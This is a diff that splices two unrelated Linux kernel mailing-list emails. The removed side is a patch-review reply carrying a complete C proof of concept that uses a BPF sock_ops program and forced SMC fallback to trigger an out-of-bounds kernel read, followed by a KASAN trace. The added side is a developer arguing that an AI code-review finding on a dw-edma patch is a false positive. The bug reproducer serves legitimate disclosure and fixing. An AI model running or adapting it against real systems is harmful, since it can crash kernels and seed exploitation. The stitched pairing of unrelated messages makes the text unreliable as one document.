@@ -1,223 +1,194 @@
-Received: from out203-205-221-164.mail.qq.com (out203-205-221-164.mail.qq.com [203.205.221.164])
+Received: from TY3P286CU002.outbound.protection.outlook.com (mail-japaneastazon11020105.outbound.protection.outlook.com [52.101.229.105])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 702511A680E
-	for <sashiko-reviews@lists.linux.dev>; Sun, 21 Jun 2026 11:28:42 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=203.205.221.164
-ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1782041325; cv=none; b=hSe3etbvz76d8RVunimZbUcoFjOMxOM+c9l7rr//ppXA9i2ecGDgR94pAg1JAwKWiJ/gythbkeX5EZjjwZQv4L3svdNNHbuuMaO99Mfn7Vk15FF5Geq1hP4K3E4MLH9Mmc1Gsmi/O88wNuc5t5a5lqOQ4eRnnaIllJkwLMXrREw=
-ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1782041325; c=relaxed/simple;
-	bh=rL57JaiUOHC1qiFgtgpKHdCLa1ymbOoJzTz01KqUKYE=;
-	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
-	 In-Reply-To:Content-Type; b=XdN3S9JKIEqKsddCFVFXv3DvSsd2lImGuiuX3xY6drUj6NtT9rXdhWhpHakCsCHx3z3sty2GtMLNQPhtILVbtTKis71XQHgpmCLxl81MEwfeEQl55UkjpgF745pIsiELX8vH5LQ9CJhynswzyZdbSKcW7e2LIMkukz+ilqH46bQ=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=uF53iXao; arc=none smtp.client-ip=203.205.221.164
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8545336F437
+	for <sashiko-reviews@lists.linux.dev>; Sun, 21 Jun 2026 14:35:43 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=52.101.229.105
+ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1782052545; cv=fail; b=YEhUrUFA3gM/qJ9InzD4GG6QqKNTbPY0VOotZwyWS3n3eUcfx5+2Z0MaY8f2rc94N0TjzNxvRJoSYh0TeWpQQS9vf0fdye6s5LAbe48YY8gTm2uJlcK6Hwic22uG64xucwNe2yU6ZligmF+4wJeqCxi581JAhOPjqamHraGUJn8=
+ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1782052545; c=relaxed/simple;
+	bh=ao1cMbF7isrVCp/TzGurklCyHAihXJVCcKjWXK9Bj9I=;
+	h=Date:From:To:Cc:Subject:Message-ID:References:Content-Type:
+	 Content-Disposition:In-Reply-To:MIME-Version; b=swcPm/9rlGRVSdrYdo2uvgTEcjRCyxYKtuynZShiPrIOp02lsklfiaEAT0mdAkLgdEkV9vgP3cUELBVYAKN/c2GfXndUeNyvk2lX1xjOUnkfPKV1IW9S0YvtgLOdX8ObL4f163jwlUeaZVwM5APWjfHJVLiaY15RDxEiY3EbQjA=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=valinux.co.jp; spf=pass smtp.mailfrom=valinux.co.jp; dkim=fail (1024-bit key) header.d=valinux.co.jp header.i=@valinux.co.jp header.b=hTfmCaXm reason="signature verification failed"; arc=fail smtp.client-ip=52.101.229.105
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=valinux.co.jp
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=valinux.co.jp
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="uF53iXao"
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
-	t=1782041314; bh=DmBi3wOFGWxORVVzo7KUN8GyCSjx2r5ZHl6IleBQF/g=;
-	h=Date:Subject:To:Cc:References:From:In-Reply-To;
-	b=uF53iXaoco/1dbOHPJVUPGr+cJ92GDL7vJzsXLqVJh2tpv88Tpq4tSHCaQ92FcJfT
-	 yYLLNjUzbjd9CCnWYGQiHCZQcRFtiOfGhe1dSCeX7x+uOIVIDV9nuOmoTuJQf4T1ou
-	 qnfVfD1pn7RFoCJxKjxkow8B7oxx+d98JmAUaPA0=
-Received: from [192.168.3.157] ([115.156.144.140])
-	by newxmesmtplogicsvrszc56-0.qq.com (NewEsmtp) with SMTP
-	id 71F8266D; Sun, 21 Jun 2026 19:28:31 +0800
-X-QQ-mid: xmsmtpt1782041311tvb4danci
-Message-ID: <tencent_8E5C38BD467714A73238DE9E6454646EC407@qq.com>
-X-QQ-XMAILINFO: N/WmRbclY25Ge55ZC1eeD+AYUgzLz0niYmsJ3IlPW9CdTYjvaKSiMB03AI4kHo
-	 NxPqWeNeOakjwjneUJYjA2te6DbzNMHrXKnJSQ2mC9EIOkvhqTZJzAmOhYpbqs1BuLkhk1M+40sg
-	 zQih5KUPIso/iyxdwdAzsazPNkV0hJmfzGlVjLYE3MCWFYVOoYFZUmV81nP1bZacce4UjL20dilG
-	 wTZTr3E+zQRGA0BxgRwowPq3cGRIXqIwybXBhn/OyPzkS5aVlDprKBRkT9SmmrBiEQmP5gZhm739
-	 bE8rkA+eFKwMLOO+RdNuCMaEQKmdNNxoGTFpzpw2Pmu6LzqTevfpSGrDaUjXueCDbObIammyM6N/
-	 LI0z56akNEuETYE29qW34E8705qzm/t1GUng96ag+qMQiATFunpnGAZCCJtTjwebNkS0nrwkTXpg
-	 cWT92/Bsts5bIV39sGW+1k1AwKgF5TocMoKHZvVUQdhAAOlHnHepPDSDw05mYrnp8ONb3cmVzNw3
-	 5yIx6L/tdYyL+m5TWSnSno+KWW3iIIbjoS6L5E2EZT9oUBGXHMJfbyNPfTKaGsueWy6iE4YXUJX3
-	 Lq44NDubFHJRBGhlH3JO7kN6k2HkConz062Qz5PYU67dLotpKH0NsZqXQ1AQNQX5NiCU2Utd+ksC
-	 gh61tTNtElfX/zMZX4vImrL1GN1eA6Ei8gG12qbIIq+wJiNB4nZgWIx05vl80m84P0jmqzFMKRk6
-	 tfJlnL9u9VJX1Lfh7IC+ulItulsCqX44Wzbz4V2iCJSdw6vywLqTVot+q+6tS2QK4jZTr2UMyvVY
-	 CaKaJKLsCm3bj+iEj8/OGa9dQoB7nBX020Q+8IoO23jRtXpw65zyENMvpyGb8Vc5Kotq1ry48t7i
-	 oWa04ZNYATLh/ZNlI22O057SZVJQlQoL4dInlBv2EWzGibzGUgTTYfo/KBYr0tWM/fNfozRfcUUX
-	 567Cgz5DyEhaGopu8Q6DzVfQEkCuk+yAUwer6u2vDo3OrAN1C51HGkqASTH0oplkt2NjRZ99I6XM
-	 X0BkEE0n2LVAfUbKrI7NOtEGvRUHzx1JVlHa9zCuy9gGGRnFRpPAXdBx0Gkd5egpfAF8xsCNGNhF
-	 ReqqCc
-X-QQ-XMRINFO: NyFYKkN4Ny6FuXrnB5Ye7Aabb3ujjtK+gg==
-X-OQ-MSGID: <84741f7e-057a-4f34-883b-e2a3af1a6f20@qq.com>
-Date: Sun, 21 Jun 2026 19:28:29 +0800
+	dkim=fail reason="signature verification failed" (1024-bit key) header.d=valinux.co.jp header.i=@valinux.co.jp header.b="hTfmCaXm"
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
+ b=YjKHJR+cGteiLrSH7SkrI0DfgsEVr5o7GoWnKC9IosTt4FagxIrB/P9rh9AOiG85N6dsb3Ii/JtEJXSjeV0PDS1hH7b4PlUnm1jNsJWU15+QyO43G/rRXMYKqaFHHi3WjLrymdvLy7MvojU2oUVd+xzyWyI280VAPfjKCPgrYR0rYgYY7PsEK80vvnkD3BldcC7J5ISCfRXCzpgX33ZJNPwlTwxSkfflH1cYK/nQ32kk9ayykWn1yniBZhOwyFQCDjLF6e/u+xU3lJBzMLSwZicFIii0dkVzT89KMURC+bMSr8nRd3wSDhWhG1JAqZUUqKVpsDRK6/zqafh8oAG0nQ==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector10001;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=pMVcVKHqJkfI4vW666Rhv585VAoJitcO0Eq+zytx/9A=;
+ b=R+lHZ1I2gTkXay2JHp6qIZQrlzg/yKKjwomcwIVSZCnDfBulgkP4gtCOXRNIhK7wGt1aNGDi5+G7fkqF6fHETYnfI7gZaQPDPgJQ6DAYYzPMbQ+Az2aPHTvuFjDbeohZgUdkZmwPQ99R17whdl4LE96B11JGHbeOPIr3plg75yv5bj3eV4nY5kQA82nM5di7oy45f0wZbCc87pOOsKw1ASCWyUeCB+3IaKi6bRLOZUrZ6e6jORr0oMqye3kilyvd2sPZF/P6HaGonXz3M3ibvsOUFlKBwPYoXX9TO2tT0uNcZoaiHiKG1eijoJv+1nCoTm0nPOxrCQHMKIKaiR4qvA==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
+ smtp.mailfrom=valinux.co.jp; dmarc=pass action=none
+ header.from=valinux.co.jp; dkim=pass header.d=valinux.co.jp; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=valinux.co.jp;
+ s=selector1;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
+ bh=pMVcVKHqJkfI4vW666Rhv585VAoJitcO0Eq+zytx/9A=;
+ b=hTfmCaXmG+AlWNstfO2KYBRCyD2NnNNVWx6PrLh++Zaahadhn9+Ru6qySjjG1mAAiqUhGpwq5EgwkO9EDZq6OekaKY7JcwPDcT1Zqbxj92H+JRMZYphEHtRmfc3geEnTOQEXvWLyDEX20jwwh1DGgp0/r8HtCcwAInxJBy0ccgQ=
+Authentication-Results: dkim=none (message not signed)
+ header.d=none;dmarc=none action=none header.from=valinux.co.jp;
+Received: from TY7P286MB7722.JPNP286.PROD.OUTLOOK.COM (2603:1096:405:38f::10)
+ by TY4P286MB5774.JPNP286.PROD.OUTLOOK.COM (2603:1096:405:2c7::10) with
+ Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.21.139.19; Sun, 21 Jun
+ 2026 14:35:35 +0000
+Received: from TY7P286MB7722.JPNP286.PROD.OUTLOOK.COM
+ ([fe80::2305:327c:28ec:9b32]) by TY7P286MB7722.JPNP286.PROD.OUTLOOK.COM
+ ([fe80::2305:327c:28ec:9b32%5]) with mapi id 15.21.0139.018; Sun, 21 Jun 2026
+ 14:35:35 +0000
+Date: Sun, 21 Jun 2026 23:35:33 +0900
+From: Koichiro Den <den@valinux.co.jp>
+To: sashiko-reviews@lists.linux.dev
+Cc: vkoul@kernel.org, Frank.Li@kernel.org, dmaengine@vger.kernel.org
+Subject: Re: [PATCH v3 01/13] dmaengine: dw-edma: Add per-channel interrupt
+ routing control
+Message-ID: <srhpqgi4vitjhbehchlq7ri6yti6ghvlxjzszxad2lmfvr6vz4@aqfnmcew3zlu>
+References: <20260620170040.3756043-1-den@valinux.co.jp>
+ <20260620170040.3756043-2-den@valinux.co.jp>
+ <20260620171353.436AE1F000E9@smtp.kernel.org>
+Content-Type: text/plain; charset=iso-8859-1
+Content-Disposition: inline
+Content-Transfer-Encoding: 8bit
+In-Reply-To: <20260620171353.436AE1F000E9@smtp.kernel.org>
+X-ClientProxiedBy: TYCP286CA0031.JPNP286.PROD.OUTLOOK.COM
+ (2603:1096:400:29d::6) To TY7P286MB7722.JPNP286.PROD.OUTLOOK.COM
+ (2603:1096:405:38f::10)
 Precedence: bulk
 X-Mailing-List: sashiko-reviews@lists.linux.dev
 List-Id: <sashiko-reviews.lists.linux.dev>
 List-Subscribe: <mailto:sashiko-reviews+subscribe@lists.linux.dev>
 List-Unsubscribe: <mailto:sashiko-reviews+unsubscribe@lists.linux.dev>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH net] net/smc: fix out-of-bounds read in
- smc_clcsock_data_ready()
-To: sashiko-reviews@lists.linux.dev, Sechang Lim <rhkrqnwk98@gmail.com>
-Cc: Vasily Gorbik <gor@linux.ibm.com>,
- Alexander Gordeev <agordeev@linux.ibm.com>, linux-s390@vger.kernel.org,
- bpf@vger.kernel.org, Heiko Carstens <hca@linux.ibm.com>
-References: <20260614120931.4041687-1-rhkrqnwk98@gmail.com>
- <20260615120954.99EA21F000E9@smtp.kernel.org>
-From: XIAO WU <xiaowu.417@qq.com>
-In-Reply-To: <20260615120954.99EA21F000E9@smtp.kernel.org>
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 8bit
+X-MS-PublicTrafficType: Email
+X-MS-TrafficTypeDiagnostic: TY7P286MB7722:EE_|TY4P286MB5774:EE_
+X-MS-Office365-Filtering-Correlation-Id: b5434c95-93bf-418d-4eef-08decfa25ae1
+X-MS-Exchange-SenderADCheck: 1
+X-MS-Exchange-AntiSpam-Relay: 0
+X-Microsoft-Antispam:
+	BCL:0;ARA:13230040|10070799003|366016|376014|23010399003|1800799024|6133799003|3023799007|56012099006|4143699003|18002099003|22082099003;
+X-Microsoft-Antispam-Message-Info:
+	/1aS6phgtEDY6veayhvrMrV0WFuknfolAtlJ7Q2eWQJ6A6AClHgQCXPVDNJ1oqleZM4dHsd0EN1XZkuNED9BSqMkYEhQcUWlgCSH3/pblAmA0aYW/Lcq1V1/KHS3kdlt5uEY9MbP3yGxRZXghGFSHkStTfV8oCUgq8fPdLjoPRy3oJ07WcWyd/a6tNdDKnqJg0tq77UI5ZfjXFVzGed2fPLSW4yu5+uadDPrXIpZ7G3UTL7aRHcu2ZKdLbl+DNx1M3NbaNk7qzppFf87MtzxWrrvxG/z7M0+AcxaVHLTQgjvTgYHw/PQQOJMJ85xJDpTL7zNNVnI1sl3lRtqw+6GmuGGEbUrpMvF5aAOJ9BPRBxQVgguk7+LzTm+bo/H3Ylu+gmmKyvqHfvkNj117bc8qLTfQkMrld98VhwTeBdK20/vCRIO8edtL9QVIKkNBw9TSCZZpgPFbFJHmU/Dx8PvvCdyTh5qzP2fA3PuPh1//XWAeDm7q/FFnmatq2g6cbFfagWfDGlw8iOIQoxR5wdcCqpta0gv1fPvMULokBQ0esYdrfF3MhzyYEwVz3ksf2aMmXeXIjmCOCmVMXjNIwPlPAeG2YDPZ0mGE7fJ4xLX6UI=
+X-Forefront-Antispam-Report:
+	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:TY7P286MB7722.JPNP286.PROD.OUTLOOK.COM;PTR:;CAT:NONE;SFS:(13230040)(10070799003)(366016)(376014)(23010399003)(1800799024)(6133799003)(3023799007)(56012099006)(4143699003)(18002099003)(22082099003);DIR:OUT;SFP:1102;
+X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
+X-MS-Exchange-AntiSpam-MessageData-0:
+	=?iso-8859-1?Q?dEx++/QkoTtcsjxXpVEaLmhlU3QIpUrGIIxS5aOrnEyO1HHIIBcVsQ+/ZR?=
+ =?iso-8859-1?Q?pK9j3IrpOjQQtMK5n5C32TtDloSS/sVb3Gyaqs8bHO8UaUN+MahaWEnJHI?=
+ =?iso-8859-1?Q?C6MS0B1bW4LLV6an81+ZcPnoalbhqhbnWlRh6dPGhjxpF5bJf6Yr4CYrdY?=
+ =?iso-8859-1?Q?si64tz2+/QsdCdLTjzW2KqQqva9t4hOqjIADJnU41QjTMrpJcXyFCq6+Js?=
+ =?iso-8859-1?Q?3m0qgV+Tb6S6adJsM+cfo4uek+X8YGc0cEZRcnz6CC3jzsvSPDtNibU1Br?=
+ =?iso-8859-1?Q?vOa2a1aw823hwVpIP/+NVUTNLHNZ0D1+7pHhTVaEzTxxrOO2dCg9Kd5a69?=
+ =?iso-8859-1?Q?/X31Lf8YphYmUjxt3Vh4BOljr9sA4uQCgTttgC7uqAoaUPdyEj4v6fQv6t?=
+ =?iso-8859-1?Q?DCRzRrkU5k2S55bW+r0L6Oz9Z+pl27puEuYtJw6HOcofqPWmJZHFKUH6IZ?=
+ =?iso-8859-1?Q?FO6DApIRfDlFse3B3ln76BzBGlKbWs7/zkgi7Lub0LPqiS3czXTS51Ozcb?=
+ =?iso-8859-1?Q?0dCM2QVnluFBJ9Hul4jbEGchX551FMd55YGD6xIibCSwvixv1FUPDF41Sr?=
+ =?iso-8859-1?Q?a6pBPBtE58LW2rws4feOmBcuRYAdwkNcT41mB1KNVyW/lRyI1/IVQiUqDC?=
+ =?iso-8859-1?Q?A0/wd9Qu9S9OZMDylpzosyjIgcBwvWpH+dBqPir72Y4U+C6+FYcu60bsOE?=
+ =?iso-8859-1?Q?ILni0K8ix9d390Jj+vt1erlxO+jYdym6q5jrc7JwG+J8kwjJZ+Rlo1oSqT?=
+ =?iso-8859-1?Q?1t9GO8FbhInqPaOZpuAWd2a8PdWMM8m0GPRQkLClzliF3C8tp8y3HO9Kxo?=
+ =?iso-8859-1?Q?bL/uCdpNsHaFhz+cA3s0NrRRGpVOPmWy9B66aXIWpF/vP5MI3QVe/Lv3ye?=
+ =?iso-8859-1?Q?SnFhcgHqRJ5gkmLo9y2ZUoOShcj/Kg1YPFKZfBOJBpq3YXRBw1tfM6Eyuv?=
+ =?iso-8859-1?Q?NnBu3wrB8wvkDglcvJ2fzG7ShJaVDm9dsIsYSfcu8pVRUHyCp9xvC0xu8d?=
+ =?iso-8859-1?Q?H0XJpO1oO93xZKkaURjr3ywMzYmZCKtA4wmpcEac7L+3Mc0u9ejiWyq7VU?=
+ =?iso-8859-1?Q?VKe0WDEcUqL1w02UZLhNu7DsDc3el/tAOwnn0k5KV33qiYqQ/1nGnsLoEW?=
+ =?iso-8859-1?Q?gl+D+5GmWfmXhrgSFvLHvu/3yNrbUxX3H7/3KZEKyINo7jXOd55o8a5RIL?=
+ =?iso-8859-1?Q?c268TJmajJ9ye6bFYz4mQm0yZcsIZQBX8WuKW1qQYdNXMLoFJ0nDncw86i?=
+ =?iso-8859-1?Q?A2xNeN3KXz1mtcWxOLfuVbNPOK9YfLcMmj3LYcQFJkc5v5CQsQWKC+DgnA?=
+ =?iso-8859-1?Q?w12g+PvOmvVySmwFngY94B+rlceIGCxBDX2U0beaiozaf4lkbHdEIAwqb3?=
+ =?iso-8859-1?Q?/vcGj6i7F9tAe+x9qiz2i3awItFqg5UY8X+PWTyKbSyPvbl2MJvTxXYbHD?=
+ =?iso-8859-1?Q?ujCGOrntzYSTs7fv6fwNb8p2FCC/03BUJOF0NL0TQIDcbi4+pb/JzrSwBp?=
+ =?iso-8859-1?Q?VwvFHpv7aNI93zDZweqEb3EneMgys7kyME6QwaN+02LfyFvtJrrlCHavYC?=
+ =?iso-8859-1?Q?5pWZ/MMldhXwlyGiM2rcsX/D6D5JpB9KrRTukYQbzqxYEtVnWscMzlhp8Q?=
+ =?iso-8859-1?Q?cfSFIPqN7TEjhQ3/S63uPkIy6Ur7FOaqsrm04XWLCGP3m1LyX4qMPpgU0E?=
+ =?iso-8859-1?Q?qf4iw7WlJD3puFcfsSxj5TFT0LyPUJZKq3Msicr1Rs3FR7TTki5SaerrDn?=
+ =?iso-8859-1?Q?QnfDspGfxVykIKzl3HAz4ICzlDp2kB1rd3OmOOT3KkCWvgDdxs+KD+0y6x?=
+ =?iso-8859-1?Q?QBNDVnyLeGBirHnUBpO/HK4Q0FxemdBZYBXDA1lNdo0qIYxT/K52?=
+X-OriginatorOrg: valinux.co.jp
+X-MS-Exchange-CrossTenant-Network-Message-Id: b5434c95-93bf-418d-4eef-08decfa25ae1
+X-MS-Exchange-CrossTenant-AuthSource: TY7P286MB7722.JPNP286.PROD.OUTLOOK.COM
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-OriginalArrivalTime: 21 Jun 2026 14:35:35.0070
+ (UTC)
+X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
+X-MS-Exchange-CrossTenant-Id: 7a57bee8-f73d-4c5f-a4f7-d72c91c8c111
+X-MS-Exchange-CrossTenant-MailboxType: HOSTED
+X-MS-Exchange-CrossTenant-UserPrincipalName: Jg/Z2vS69GHPHrg+V+0yK570JRSvER446v66yNRA6TM5lwogKtpt4cAZxAGLG1CIPXaLf13z+BEVp8nCYJWWWA==
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: TY4P286MB5774
 
-  Hi Sechang,
+On Sat, Jun 20, 2026 at 05:13:52PM +0000, sashiko-bot@kernel.org wrote:
+> Thank you for your contribution! Sashiko AI review found 1 potential issue(s) to consider:
+> - [High] V0 eDMA fails to set the Remote Interrupt Enable (RIE) bit for remote-routed channels on a local endpoint controller.
 
-I saw your v2 is coming — before you send it, I wanted to share a PoC
-that triggers the `smc_fback_state_change` callback OOB that the Sashiko
-review flagged.
+This is a false positive.
 
-Your patch restores `child->sk_data_ready`, but the other three fallback
-callbacks (`sk_state_change`, `sk_write_space`, `sk_error_report`)
-installed by `smc_fback_replace_callbacks()` remain inherited from the
-listen socket and read the child's `sk_user_data` as an `smc_sock`.
+> --
+> 
+> commit df5a2947e52cc02cfc126b63bc365277ac3752fa
+> Author: Koichiro Den <den@valinux.co.jp>
+> dmaengine: dw-edma: Add per-channel interrupt routing control
+> 
+> This commit adds per-channel interrupt routing control to the DesignWare
+> eDMA driver, allowing channels to route completion signals locally or
+> remotely. It updates the v0 eDMA and HDMA paths to configure interrupt masks
+> and generation based on the selected mode.
+> 
+> > diff --git a/drivers/dma/dw-edma/dw-edma-v0-core.c b/drivers/dma/dw-edma/dw-edma-v0-core.c
+> > --- a/drivers/dma/dw-edma/dw-edma-v0-core.c
+> > +++ b/drivers/dma/dw-edma/dw-edma-v0-core.c
+> [ ... ]
+> > @@ -331,7 +335,8 @@ static void dw_edma_v0_core_write_chunk(struct dw_edma_chunk *chunk)
+> >  		j--;
+> >  		if (!j) {
+> >  			control |= DW_EDMA_V0_LIE;
+> > -			if (!(chan->dw->chip->flags & DW_EDMA_CHIP_LOCAL))
+> > +			if (!(chan->dw->chip->flags & DW_EDMA_CHIP_LOCAL) &&
+> > +			    chan->irq_mode != DW_EDMA_CH_IRQ_LOCAL)
+> >  				control |= DW_EDMA_V0_RIE;
+> >  		}
+> 
+> [Severity: High]
+> When a local endpoint controller delegates a channel to a remote host, the
+> irq_mode is set to DW_EDMA_CH_IRQ_REMOTE, but DW_EDMA_CHIP_LOCAL is also
+> present in the chip flags.
+> 
+> Because the check in dw_edma_v0_core_write_chunk() explicitly requires that
+> DW_EDMA_CHIP_LOCAL is not present, the first condition evaluates to false
+> and DW_EDMA_V0_RIE is never set.
 
-I confirmed this by loading a BPF sock_ops program that calls
-`bpf_sock_hash_update()` on the child socket, then sending data. The
-BPF helper populates `sk_user_data` with a `sk_psock`, and the inherited
-`smc_fback_state_change` misreads it.
+The key point is that a delegated channel is not driven by any EP-local
+consumer. The EP side calls dw_edma_request_delegated_chan() only to reserve the
+exact HW channel, so no local DMA engine client can take it while it is exposed
+to the host. pci-epf-dma itself never submits DMA transfers on that channel.
 
-[KASAN report — kernel 7.1.0-rc7-next-20260612, CONFIG_KASAN=y]
+Transfers on delegated channels are programmed by the RC-side dw-edma-pcie [1],
+after the DMA register window and descriptor memory have been exposed through
+the BARs. On that RC-side instance, DW_EDMA_CHIP_LOCAL is not set, so the
+existing condition still sets DW_EDMA_V0_RIE.
 
-   BUG: KASAN: slab-out-of-bounds in smc_fback_state_change+0xb4/0xc0
+So the EP-local channel having irq_mode == DW_EDMA_CH_IRQ_REMOTE does not mean
+that the EP-local instance will call dw_edma_v0_core_write_chunk() for that
+channel. It only means that the EP-local instance must not consume the
+completion status if a local interrupt is unexpectedly observed.
 
-   Call Trace:
-    <TASK>
-    smc_fback_state_change+0xb4/0xc0
-    ...
-    bpf_prog_... → bpf_sock_hash_update → sock_hash_update_common
-      → sock_map_link → sk_psock_init
+[1] The protocol does not exclude other RC-side consumers for other vendors in
+    the future. dw-edma-pcie is just the first supported consumer for the
+    pci-ep-dma.h protocol.
 
-Full PoC (poc.c):
----8<----------------------------------------------------------------
-/*
-  * PoC: OOB read in smc_fback_state_change
-  *
-  * Trigger: force SMC fallback -> listen -> BPF sock_ops attaches
-  * sk_psock via bpf_sock_hash_update() -> inherited smc_fback_state_change
-  * misreads sk_psock as smc_sock -> KASAN OOB.
-  *
-  * gcc -o poc poc.c
-  */
-#include <errno.h>
-#include <fcntl.h>
-#include <netinet/in.h>
-#include <netinet/tcp.h>
-#include <arpa/inet.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/mount.h>
-#include <sys/socket.h>
-#include <sys/stat.h>
-#include <sys/syscall.h>
-#include <sys/types.h>
-#include <sys/wait.h>
-#include <unistd.h>
-#include <linux/bpf.h>
+Best regards,
+Koichiro
 
-#ifndef __NR_bpf
-#define __NR_bpf 321
-#endif
-
-static int bpf(enum bpf_cmd cmd, union bpf_attr *attr, unsigned int size)
-{ return syscall(__NR_bpf, cmd, attr, size); }
-
-static int create_sockhash(void)
-{
-     union bpf_attr attr = { .map_type = 15 /*BPF_MAP_TYPE_SOCKHASH*/,
-         .key_size = 4, .value_size = 8, .max_entries = 64 };
-     return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
-}
-
-static int load_prog(int map_fd)
-{
-     struct bpf_insn prog[] = {
-         /* r2 = *(u32 *)(r1 + 0) */
-         {0x61, 2, 1, 0, 0},
-         /* if r2 != 2 (BPF_SOCK_OPS_PASSIVE_ESTABLISHED_CB) goto +8 */
-         {0x55, 2, 0, 8, 2},
-         /* *(u32 *)(r10 - 8) = 1 */
-         {0x62, 10, 0, -8, 1},
-         /* r3 = r10; r3 += -8 */
-         {0xbf, 3, 10, 0, 0}, {0x07, 3, 0, 0, -8},
-         /* r4 = 0 */
-         {0xb4, 4, 0, 0, 0},
-         /* r2 = map_fd (2 insns) */
-         {0x18, 2, 0, 0, map_fd}, {0, 0, 0, 0, 0},
-         /* call 70 (bpf_sock_hash_update) */
-         {0x85, 0, 0, 0, 70},
-         /* r0 = 0; exit */
-         {0xb7, 0, 0, 0, 0}, {0x95, 0, 0, 0, 0},
-     };
-     union bpf_attr attr = { .prog_type = 8 /*BPF_PROG_TYPE_SOCK_OPS*/,
-         .insns = (__u64)(unsigned long)prog, .insn_cnt = 
-sizeof(prog)/sizeof(prog[0]),
-         .license = (__u64)(unsigned long)"GPL" };
-     return bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
-}
-
-static int setup_cgroup(int prog_fd)
-{
-     mkdir("/sys/fs/cgroup", 0755);
-     mount("none", "/sys/fs/cgroup", "cgroup2", 0, NULL);
-     mkdir("/sys/fs/cgroup/poc", 0755);
-     int cg_fd = open("/sys/fs/cgroup/poc", O_DIRECTORY|O_RDONLY);
-     union bpf_attr attr = { .attach_type = 34 /*BPF_CGROUP_SOCK_OPS*/,
-         .target_fd = cg_fd, .attach_bpf_fd = prog_fd };
-     bpf(BPF_PROG_ATTACH, &attr, sizeof(attr));
-     int procs_fd = openat(cg_fd, "cgroup.procs", O_WRONLY);
-     char buf[32]; int len = snprintf(buf, sizeof(buf), "%d\n", getpid());
-     write(procs_fd, buf, len);
-     close(procs_fd); close(cg_fd);
-     return 0;
-}
-
-int main(void)
-{
-     struct sockaddr_in addr = { .sin_family = AF_INET,
-         .sin_addr.s_addr = htonl(INADDR_LOOPBACK) };
-     socklen_t addrlen = sizeof(addr);
-     int optval = 1;
-
-     int map_fd = create_sockhash();
-     int prog_fd = load_prog(map_fd);
-     setup_cgroup(prog_fd);
-
-     int smc_fd = socket(AF_SMC, SOCK_STREAM, 0);
-     setsockopt(smc_fd, SOL_TCP, TCP_FASTOPEN, &optval, sizeof(optval));
-     bind(smc_fd, (struct sockaddr *)&addr, sizeof(addr));
-     getsockname(smc_fd, (struct sockaddr *)&addr, &addrlen);
-     listen(smc_fd, 5);
-
-     pid_t pid = fork();
-     if (pid == 0) {
-         usleep(100000);
-         int cfd = socket(AF_INET, SOCK_STREAM, 0);
-         connect(cfd, (struct sockaddr *)&addr, sizeof(addr));
-         send(cfd, "hello", 5, 0);
-         usleep(300000); close(cfd); _exit(0);
-     }
-
-     int new_fd = accept(smc_fd, NULL, NULL);
-     if (new_fd >= 0) { char buf[64]; read(new_fd, buf, sizeof(buf)-1); 
-close(new_fd); }
-     waitpid(pid, NULL, 0);
-     close(smc_fd); close(prog_fd); close(map_fd);
-     printf("[+] Done. Check dmesg.\n");
-     return 0;
-}
----8<----------------------------------------------------------------
-Compile: gcc -o poc poc.c
-
-[1] 
-https://sashiko.dev/#/patchset/20260614120931.4041687-1-rhkrqnwk98%40gmail.com
-
-Thanks,
-XIAO
-
+> 
+> According to the commit message, requesting a remote-only interrupt requires
+> setting both LIE and RIE while masking the local interrupt. Since
+> dw_edma_v0_core_start() correctly masks the local interrupt for these
+> channels, does this prevent the DMA completion event from being sent
+> entirely, potentially causing the remote host to wait forever?
